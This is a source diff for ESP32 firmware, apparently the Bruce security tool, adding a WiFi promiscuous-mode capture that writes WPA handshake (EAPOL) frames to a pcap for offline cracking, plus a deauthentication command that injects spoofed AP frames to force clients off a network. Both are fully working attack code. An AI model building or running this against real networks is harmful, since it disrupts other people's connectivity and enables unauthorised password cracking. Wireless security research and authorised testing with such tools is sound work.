@@ -7,7 +7,10 @@
 #include <Esp.h>
 #include <FS.h>
 #include <WiFi.h>
+#include <cstring>
 #include <esp_random.h>
+#include <esp_wifi.h>
+#include <freertos/queue.h>
 #include <globals.h>
 #include <mbedtls/base64.h>
 #include <mbedtls/sha256.h>
@@ -77,6 +80,29 @@ uint32_t g_capSamples = 0;
 uint32_t g_capProgMs = 0;
 mbedtls_sha256_context g_capCtx;
 
+// --- handshake (WiFi packet) capture state -----------------------------------
+// A "handshake" capture is a packet capture, not a sweep: WiFi runs in
+// promiscuous mode and the rx callback COPIES matching frames (beacons/probe-
+// responses for the SSID + EAPOL data frames) into a queue. companion::tick()
+// drains the queue and writes a libpcap (DLT 105) file — so no SD I/O happens in
+// the WiFi-driver callback context. Reuses the capture file/sha/byte infra so
+// stop/status/file-get all work unchanged; the host cracks the fetched pcap.
+struct HsPkt {
+    uint16_t len;
+    uint32_t ts_sec, ts_us;
+    uint8_t data[256]; // EAPOL frames are ~155 B; beacons truncated (SSID is early)
+};
+QueueHandle_t g_hsQueue = nullptr;
+bool g_hsActive = false;
+uint32_t g_hsDrop = 0; // best-effort dropped-frame counter (queue full)
+const uint8_t g_hsChannels[] = {1, 6, 11, 2, 3, 4, 5, 7, 8, 9, 10};
+int g_hsChanIdx = 0;
+uint8_t g_hsFixedCh = 0; // 0 = hop across g_hsChannels
+uint32_t g_hsHopMs = 0;
+uint8_t g_hsBssid[6] = {0};
+bool g_hsHaveBssid = false; // when set, only frames to/from this BSSID are kept
+const uint8_t EAPOL_LLC[8] = {0xAA, 0xAA, 0x03, 0x00, 0x00, 0x00, 0x88, 0x8E};
+
 String buildCaps() {
     String c = "wifi,rf,ir,nrf,gpio,crypto,storage,status,gps,util,settings,power";
 #ifdef USB_as_HID
@@ -102,6 +128,29 @@ String fieldValue(const String &payload, const String &key) {
     int e = payload.indexOf(' ', i);
     if (e < 0) e = payload.length();
     return payload.substring(i, e);
+}
+
+// Parse "AA:BB:CC:DD:EE:FF" (or with '-') into 6 bytes. Returns false on bad input.
+bool parseMac(const String &s, uint8_t out[6]) {
+    int n = 0;
+    uint8_t b = 0;
+    int nib = 0;
+    for (size_t i = 0; i < s.length() && n < 6; i++) {
+        char c = s[i];
+        if (c == ':' || c == '-') continue;
+        int v;
+        if (c >= '0' && c <= '9') v = c - '0';
+        else if (c >= 'a' && c <= 'f') v = c - 'a' + 10;
+        else if (c >= 'A' && c <= 'F') v = c - 'A' + 10;
+        else return false;
+        b = (b << 4) | v;
+        if (++nib == 2) {
+            out[n++] = b;
+            b = 0;
+            nib = 0;
+        }
+    }
+    return n == 6;
 }
 
 // Emit one raw frame line to the real transport (the current global device).
@@ -130,6 +179,79 @@ void emitData(const String &payload) {
     } else {
         emit("EVT " + String(g_streamId) + " " + payload);
     }
+}
+
+// Binary capture write (for the pcap handshake capture): same sha/byte folding
+// as capWrite but raw bytes (NUL-safe), so the stop-RSP sha covers the file.
+void capWriteBin(const uint8_t *d, size_t n) {
+    if (!g_capFile) return;
+    g_capFile.write(d, n);
+    mbedtls_sha256_update(&g_capCtx, d, n);
+    g_capBytes += n;
+}
+
+// libpcap global header: magic a1b2c3d4, v2.4, snaplen 65535, network 105
+// (DLT_IEEE802_11). ESP32 is little-endian so memcpy yields the LE byte order
+// the host wpa_crack reader expects.
+void hsPcapGlobalHeader() {
+    uint8_t h[24];
+    uint32_t magic = 0xA1B2C3D4, zero = 0, snap = 65535, net = 105;
+    uint16_t vmaj = 2, vmin = 4;
+    memcpy(h, &magic, 4);
+    memcpy(h + 4, &vmaj, 2);
+    memcpy(h + 6, &vmin, 2);
+    memcpy(h + 8, &zero, 4);
+    memcpy(h + 12, &zero, 4);
+    memcpy(h + 16, &snap, 4);
+    memcpy(h + 20, &net, 4);
+    capWriteBin(h, 24);
+}
+
+void hsWritePkt(const HsPkt &q) {
+    uint8_t rh[16];
+    uint32_t l = q.len;
+    memcpy(rh, &q.ts_sec, 4);
+    memcpy(rh + 4, &q.ts_us, 4);
+    memcpy(rh + 8, &l, 4);  // incl_len
+    memcpy(rh + 12, &l, 4); // orig_len (we cap at sizeof data; truncation is benign)
+    capWriteBin(rh, 16);
+    capWriteBin(q.data, q.len);
+}
+
+// Promiscuous rx callback — runs in WiFi-driver context, so it does NO SD I/O:
+// it only filters (beacon/probe-resp + EAPOL) and copies the frame into a queue.
+void hsPromiscCb(void *buf, wifi_promiscuous_pkt_type_t type) {
+    if (!g_hsActive || !g_hsQueue) return;
+    if (type != WIFI_PKT_MGMT && type != WIFI_PKT_DATA) return;
+    wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
+    const uint8_t *p = pkt->payload;
+    uint32_t len = pkt->rx_ctrl.sig_len;
+    if (len < 24) return;
+    uint16_t fc = p[0] | (p[1] << 8);
+    int ftype = (fc >> 2) & 3, subtype = (fc >> 4) & 0xF;
+    bool keep = false;
+    if (ftype == 0 && (subtype == 8 || subtype == 5)) {
+        keep = true; // beacon / probe-response — carries the SSID
+    } else if (ftype == 2) {
+        int off = 24;
+        if (subtype & 0x08) off += 2; // QoS data has a 2-byte QoS Control field
+        if (len >= (uint32_t)off + 8 && memcmp(p + off, EAPOL_LLC, 8) == 0) keep = true;
+    }
+    if (!keep) return;
+    // Optional BSSID filter: keep only frames involving the target AP (any of the
+    // three 802.11 addresses matches), so a busy band doesn't bloat the pcap.
+    if (g_hsHaveBssid && len >= 22) {
+        if (memcmp(p + 4, g_hsBssid, 6) != 0 && memcmp(p + 10, g_hsBssid, 6) != 0 &&
+            memcmp(p + 16, g_hsBssid, 6) != 0)
+            return;
+    }
+    HsPkt q;
+    q.len = len > sizeof(q.data) ? (uint16_t)sizeof(q.data) : (uint16_t)len;
+    uint32_t us = pkt->rx_ctrl.timestamp;
+    q.ts_sec = us / 1000000;
+    q.ts_us = us % 1000000;
+    memcpy(q.data, p, q.len);
+    if (xQueueSend(g_hsQueue, &q, 0) != pdTRUE) g_hsDrop++;
 }
 
 String toHex(const uint8_t *d, size_t n) {
@@ -454,6 +576,14 @@ void emitRfSweep(uint32_t now) {
 }
 
 void streamTeardown() {
+    if (g_hsActive) {
+        esp_wifi_set_promiscuous(false);
+        g_hsActive = false;
+        if (g_hsQueue) {
+            vQueueDelete(g_hsQueue);
+            g_hsQueue = nullptr;
+        }
+    }
     if (g_streamKind == "wifi") {
         int16_t st = WiFi.scanComplete();
         if (st >= 0) WiFi.scanDelete();
@@ -757,7 +887,8 @@ void handleLine(SerialCli &cli, const String &raw, SerialDevice *reply) {
             rest = spec.substring(sp + 1);
             rest.trim();
         }
-        if (kind != "telemetry" && kind != "wifi" && kind != "nrf" && kind != "rf") {
+        if (kind != "telemetry" && kind != "wifi" && kind != "nrf" && kind != "rf" &&
+            kind != "handshake") {
             emit("ERR " + String(id) + " 3 unknown capture kind=" + kind);
             return;
         }
@@ -789,6 +920,26 @@ void handleLine(SerialCli &cli, const String &raw, SerialDevice *reply) {
                 emit("ERR " + String(id) + " 4 rf init failed (CC1101 not found?)");
                 return;
             }
+        } else if (kind == "handshake") {
+            // WiFi promiscuous packet capture (beacons + EAPOL) -> pcap. Optional
+            // ch=<1..14> pins the channel (else hop); bssid=<MAC> filters the AP.
+            g_hsFixedCh = (uint8_t)fieldValue(spec, "ch").toInt();
+            String bs = fieldValue(spec, "bssid");
+            g_hsHaveBssid = bs.length() && parseMac(bs, g_hsBssid);
+            g_hsChanIdx = 0;
+            g_hsDrop = 0;
+            g_hsHopMs = millis();
+            if (WiFi.getMode() == WIFI_MODE_NULL) WiFi.mode(WIFI_STA);
+            g_hsQueue = xQueueCreate(24, sizeof(HsPkt));
+            if (!g_hsQueue) {
+                emit("ERR " + String(id) + " 4 handshake queue alloc failed");
+                return;
+            }
+            g_hsActive = true;
+            esp_wifi_set_promiscuous(true);
+            esp_wifi_set_promiscuous_rx_cb(hsPromiscCb);
+            uint8_t ch = g_hsFixedCh ? g_hsFixedCh : g_hsChannels[0];
+            esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
         }
         // Open the capture file (default under /BruceCapture, or an explicit path=).
         FS *fs;
@@ -800,7 +951,8 @@ void handleLine(SerialCli &cli, const String &raw, SerialDevice *reply) {
         String path = fieldValue(spec, "path");
         if (path.length() == 0) {
             fs->mkdir("/BruceCapture");
-            path = "/BruceCapture/" + kind + "-" + String(millis()) + ".txt";
+            const char *ext = (kind == "handshake") ? ".pcap" : ".txt";
+            path = "/BruceCapture/" + kind + "-" + String(millis()) + ext;
         }
         g_capFile = fs->open(path, FILE_WRITE, true);
         if (!g_capFile) {
@@ -813,9 +965,13 @@ void handleLine(SerialCli &cli, const String &raw, SerialDevice *reply) {
         g_capSamples = 0;
         mbedtls_sha256_init(&g_capCtx);
         mbedtls_sha256_starts(&g_capCtx, 0);
-        capWrite("# kind: " + kind + "\n");
-        capWrite("# capture: companion ms=" + String(millis()) + " interval=" +
-                 String(g_streamInterval) + "\n");
+        if (kind == "handshake") {
+            hsPcapGlobalHeader(); // binary libpcap header (DLT 105)
+        } else {
+            capWrite("# kind: " + kind + "\n");
+            capWrite("# capture: companion ms=" + String(millis()) + " interval=" +
+                     String(g_streamInterval) + "\n");
+        }
         g_capturing = true;
         g_streaming = true;
         g_streamId = id;
@@ -825,14 +981,68 @@ void handleLine(SerialCli &cli, const String &raw, SerialDevice *reply) {
         g_capProgMs = millis();      // first progress EVT after ~2s
         g_streamReply = g_reply;     // progress EVTs go to the starting transport
         g_radioOwner = "companion";
+        String extra;
+        if (kind == "rf") extra = " band=" + String(g_rfStart, 2) + "-" + String(g_rfStop, 2);
+        else if (kind == "handshake")
+            extra = String(" ch=") + (g_hsFixedCh ? String(g_hsFixedCh) : String("hop")) +
+                    (g_hsHaveBssid ? " bssid=" + fieldValue(spec, "bssid") : "");
         emit("RSP " + String(id) + " capturing=" + kind + " path=" + path + " id=" + String(id) +
-             " interval=" + String(g_streamInterval) +
-             (kind == "rf" ? " band=" + String(g_rfStart, 2) + "-" + String(g_rfStop, 2) : ""));
+             " interval=" + String(g_streamInterval) + extra);
         emit("END " + String(id) + " 0");
         return;
     }
     if (payload == "companion ping") {
         emit("RSP " + String(id) + " pong");
+        emit("END " + String(id) + " 0");
+        return;
+    }
+    // Inject deauthentication frames to knock a client off an AP so it re-does the
+    // 4-way handshake (which a concurrent `capture start handshake` then logs).
+    // Uses esp_wifi_80211_tx; the global ieee80211_raw_frame_sanity_check override
+    // (wifi_atks.cpp) lets us spoof the source AP.
+    //   companion wifi deauth bssid=<MAC> [sta=<MAC>|broadcast] [ch=N] [count=N]
+    if (payload.startsWith("companion wifi deauth")) {
+        String bs = fieldValue(payload, "bssid");
+        uint8_t ap[6], sta[6];
+        if (!bs.length() || !parseMac(bs, ap)) {
+            emit("ERR " + String(id) + " 6 deauth needs bssid=<MAC>");
+            return;
+        }
+        String stArg = fieldValue(payload, "sta");
+        bool bcast = (stArg.length() == 0 || stArg == "broadcast" || stArg == "ff");
+        if (!bcast && !parseMac(stArg, sta)) {
+            emit("ERR " + String(id) + " 6 bad sta=<MAC>");
+            return;
+        }
+        int count = fieldValue(payload, "count").toInt();
+        if (count <= 0) count = 8;
+        if (count > 256) count = 256;
+        String chArg = fieldValue(payload, "ch");
+        if (WiFi.getMode() == WIFI_MODE_NULL) WiFi.mode(WIFI_STA);
+        if (chArg.length()) esp_wifi_set_channel((uint8_t)chArg.toInt(), WIFI_SECOND_CHAN_NONE);
+        // deauth (AP -> client/broadcast), reason 7 (class-3 frame from nonassoc STA)
+        uint8_t fr[26] = {0xC0, 0x00, 0x3A, 0x01, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
+                          0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0x00, 0x00, 0x07, 0x00};
+        if (bcast) memset(fr + 4, 0xFF, 6);
+        else memcpy(fr + 4, sta, 6);
+        memcpy(fr + 10, ap, 6); // source = AP (spoofed)
+        memcpy(fr + 16, ap, 6); // BSSID
+        int sent = 0;
+        for (int i = 0; i < count; i++) {
+            if (esp_wifi_80211_tx(WIFI_IF_STA, fr, 26, false) == ESP_OK) sent++;
+            // also STA -> AP direction when a specific client is targeted
+            if (!bcast) {
+                uint8_t fr2[26];
+                memcpy(fr2, fr, 26);
+                memcpy(fr2 + 4, ap, 6);   // dst = AP
+                memcpy(fr2 + 10, sta, 6); // src = client
+                memcpy(fr2 + 16, ap, 6);
+                esp_wifi_80211_tx(WIFI_IF_STA, fr2, 26, false);
+            }
+            delay(2);
+        }
+        emit("RSP " + String(id) + " deauth bssid=" + bs + " sta=" + (bcast ? "broadcast" : stArg) +
+             " sent=" + String(sent) + "/" + String(count));
         emit("END " + String(id) + " 0");
         return;
     }
@@ -915,7 +1125,25 @@ void tick() {
         g_capProgMs = now;
         if (g_capFile) g_capFile.flush(); // crash-safety: don't leave data buffered
         emit("EVT " + String(g_streamId) + " capture seq=" + String(g_streamSeq) + " samples=" +
-             String(g_capSamples) + " bytes=" + String(g_capBytes));
+             String(g_capSamples) + " bytes=" + String(g_capBytes) +
+             (g_hsActive ? " drops=" + String(g_hsDrop) : ""));
+    }
+    // handshake packet capture: hop channels (unless pinned) and drain the queue
+    // into the pcap file. Runs every tick (no interval gate), like wifi.
+    if (g_streamKind == "handshake") {
+        if (!g_hsFixedCh && (now - g_hsHopMs) >= 300) {
+            g_hsHopMs = now;
+            g_hsChanIdx = (g_hsChanIdx + 1) % (int)sizeof(g_hsChannels);
+            esp_wifi_set_channel(g_hsChannels[g_hsChanIdx], WIFI_SECOND_CHAN_NONE);
+        }
+        HsPkt q;
+        int drained = 0;
+        while (drained < 48 && g_hsQueue && xQueueReceive(g_hsQueue, &q, 0) == pdTRUE) {
+            hsWritePkt(q);
+            g_capSamples++;
+            drained++;
+        }
+        return;
     }
     // WiFi manages its own cadence (async scan): poll every tick.
     if (g_streamKind == "wifi") {
